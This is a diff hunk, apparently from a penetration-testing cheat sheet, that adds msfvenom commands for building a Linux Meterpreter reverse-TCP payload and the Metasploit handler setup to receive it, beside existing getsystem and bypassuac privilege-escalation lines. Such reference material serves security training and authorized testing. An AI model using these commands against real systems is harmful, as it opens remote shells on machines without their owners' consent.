@@ -84,6 +84,13 @@
 	<pre>$ getsystem </pre>
 	<words> OR </words>
 	<pre>$ bypassuac </pre>
+	<words> Common Meterpreter Payloads with msfvenom </words>
+	<pre>$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f elf > payload.bin</pre>
+	<words> Listener </words>
+	<pre>$ use exploit/multi/handler </pre>
+	<pre>$ set payload linux/x64/meterpreter/reverse_tcp </pre>
+	<pre>$ set LHOST ip </pre>
+	<pre>$ set LPORT port </pre>	
 </details>
 
 ### Pivoting
